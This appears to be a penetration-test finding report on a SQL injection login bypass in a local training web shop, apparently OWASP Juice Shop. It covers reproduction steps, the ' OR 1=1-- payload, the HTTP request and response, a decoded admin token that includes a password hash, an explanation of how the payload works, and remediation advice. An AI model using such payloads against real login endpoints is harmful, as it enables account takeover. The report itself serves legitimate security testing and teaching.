# Finding F-006: SQL Injection Authentication Bypass — Full Administrator Login With No Valid Credentials

| Field | Value |
|---|---|
| Finding ID | F-006 |
| Title | SQL Injection in Login Endpoint Allows Authentication Bypass as Administrator |
| Category | OWASP Top 10 — A03:2021 Injection |
| Severity | **Critical** |
| CVSS 3.1 (estimated) | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| Status | Confirmed |
| Affected Component | `POST /rest/user/login` — `email` field |
| Date Identified | 2026-09-29 |

## Summary

The login endpoint's `email` field is vulnerable to classic SQL injection. Submitting
a crafted string in place of a real email address allows an attacker to bypass
authentication entirely — with **no valid password, no prior account, and no other
prerequisite** — and be logged in as an arbitrary user. In this case, the injected
query returned the very first user record in the database, which is the
**site administrator account** (`id: 1`, `role: admin`).

This is one of the most classic, well-documented vulnerability classes in web
security, and its impact here is maximal: complete, unauthenticated compromise of
the highest-privilege account in the application.

## Steps to Reproduce

1. Log out / ensure no active session.
2. Send `POST /rest/user/login` with the following JSON body:
   ```json
   {"email":"' OR 1=1--","password":"anything"}
   ```
3. Observe `HTTP 200 OK` with a full, valid authentication token issued — for the
   **administrator account**, despite no correct credentials having been supplied.

## Evidence

**Request sent:**
```
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"' OR 1=1--","password":" ' OR 1=1--"}
```

**Response received:**
```
HTTP/1.1 200 OK
{"authentication":{"token":"<JWT, decoded below>","bid":1,"umail":"admin@juice-sh.op"}}
```

**Decoded token payload (proves admin-level access was granted):**
```json
{
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "role": "admin",
    "isActive": true
  },
  "bid": 1
}
```

The application's own internal challenge tracker also independently confirmed this:
> "You successfully solved a challenge: Login Admin (Log in with the administrator's
> user account.)"

Full raw request/response saved in
`evidence/requests-responses/F-006-sqli-admin-login.txt`.

*(Sanitization note: the admin account's password hash and full JWT signature
should be truncated/redacted in the committed evidence file, consistent with
project evidence-handling standards — the hash value itself is not needed to
demonstrate the vulnerability, only its presence in the response.)*

## How the Payload Works (Explanation)

The backend appears to build its login query by directly concatenating user input
into a SQL statement resembling:
```sql
SELECT * FROM Users WHERE email = '<input>' AND password = '<input>'
```

The payload `' OR 1=1--` closes the string literal early with `'`, then appends a
condition (`OR 1=1`) that is **always true** for every row in the table, and finally
uses `--` to comment out the rest of the original query (including the password
check entirely). The resulting query effectively becomes:
```sql
SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '...'
```
Since `1=1` is unconditionally true, the query matches **every** row in the Users
table. The application then appears to authenticate as the **first row returned**,
which in this database is the administrator account (`id: 1`).

Note the working payload needed to be placed in the **email** field specifically —
an earlier attempt placing the same payload in the password field returned `401`,
consistent with the query structure requiring the email portion to be broken first
in order to bypass the password check that follows it.

## Impact

- **Complete authentication bypass** requiring zero prior knowledge — no valid
  email, no password, no account of any kind needed.
- **Direct compromise of the highest-privilege account** in the system on the
  very first successful attempt, not merely "some" account.
- Combined with prior findings, this is now the **fourth independent path** to
  privileged/unauthorized access discovered in this assessment (alongside F-002,
  F-003, F-005), indicating a systemic pattern of insufficient input validation
  and access control across the application, not an isolated incident.
- In a production system, this would allow complete takeover of the platform:
  access to all user data, all orders, and any admin-only functionality reachable
  via this session.
- This is a **pre-authentication** vulnerability — no login is required to exploit
  it, making it exploitable by any anonymous visitor to the site.

## Root Cause

The login query is built via **string concatenation of unsanitized user input**
directly into a SQL statement, rather than using parameterized queries / prepared
statements or an ORM's safe query-building methods.

## Remediation

1. **Use parameterized queries (prepared statements) exclusively** for all
   database access involving user input — never concatenate or template user
   input directly into a query string, in any endpoint, not just login.
2. If an ORM (e.g., Sequelize, as commonly used with Node.js/SQLite stacks) is
   already in use elsewhere in the application, ensure the login handler
   specifically is using its safe parameter-binding methods rather than raw
   query strings.
3. Apply strict server-side input validation on the `email` field (expected
   format validation) as defense-in-depth, though this should never be the
   *only* protection — parameterization is the actual fix.
4. Conduct a full audit of every other endpoint accepting user input for the
   same raw-query-concatenation pattern, since a codebase with one instance of
   this bug class frequently has more than one.
5. Add automated regression/security tests submitting common SQLi payloads
   (`' OR 1=1--`, `' OR '1'='1`, etc.) against every input field and asserting
   they are rejected or neutralized, not interpreted as query logic.

## Related Findings

- **F-002, F-003, F-005** — together with this finding, these represent four
  independent, unrelated root causes (JWT signature bypass, missing auth
  middleware, missing object-ownership checks, and now SQL injection) all
  converging on the same outcome class: unauthorized access to privileged data
  or accounts. This pattern is worth calling out explicitly in the executive
  summary as evidence of a systemic security-maturity gap, not a series of
  unlucky, isolated bugs.

## Follow-Up Testing (planned)

- [ ] Test the search bar and other input fields for the same SQL/NoSQL
      injection pattern (Step 6 continuation).
- [ ] Test whether other injection-style payloads (blind, boolean-based,
      time-based) reveal additional data beyond simple auth bypass.

## References

- OWASP Top 10 2021 — A03: Injection
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
  ('SQL Injection')
- OWASP SQL Injection Prevention Cheat Sheet —
  https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
